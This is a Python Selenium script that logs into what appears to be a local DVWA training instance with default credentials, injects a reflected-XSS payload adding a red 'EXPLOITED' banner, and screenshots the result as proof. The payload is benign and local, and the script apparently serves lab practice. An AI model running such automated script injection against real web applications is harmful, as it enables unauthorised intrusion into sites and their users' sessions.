# exploit.py - VISIBLE ON-PAGE POPUP (NO ALERT)

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from webdriver_manager.firefox import GeckoDriverManager
import time, os

def take_selfie():
    print("[+] Starting selfie robot...")
    os.makedirs("reports", exist_ok=True)

    driver = None
    try:
        print("[+] Starting Firefox...")
        firefox_options = FirefoxOptions()
        firefox_options.add_argument("--headless")
        firefox_options.add_argument("--window-size=1366,768")
        firefox_service = FirefoxService(GeckoDriverManager().install())
        driver = webdriver.Firefox(service=firefox_service, options=firefox_options)
        print("[+] Firefox ready!")

        # LOGIN
        print("[+] Logging in...")
        driver.get("http://localhost:8080/login.php")
        time.sleep(2)
        driver.find_element("name", "username").send_keys("admin")
        driver.find_element("name", "password").send_keys("password")
        driver.find_element("name", "Login").click()
        time.sleep(2)

        # GO TO XSS PAGE
        print("[+] Going to XSS page...")
        driver.get("http://localhost:8080/vulnerabilities/xss_r/")
        time.sleep(2)

        # TYPE VISIBLE PAYLOAD
        print("[+] Injecting visible popup...")
        name_box = driver.find_element("name", "name")
        name_box.clear()
        name_box.send_keys("<script>document.body.innerHTML+='<div style=\"position:fixed;top:20px;left:20px;background:red;color:white;padding:20px;font-size:20px;z-index:9999;border:3px solid black;\">XSS-AutoPwn EXPLOITED!</div>';</script>")
        driver.find_element("css selector", "input[type='submit']").click()
        time.sleep(3)

        # TAKE SELFIE
        driver.save_screenshot("reports/proof.png")
        print("[+] SELFIE SAVED WITH VISIBLE POPUP: reports/proof.png")

    except Exception as e:
        print(f"[x] ERROR: {e}")
    finally:
        if driver:
            driver.quit()

if __name__ == "__main__":
    take_selfie()
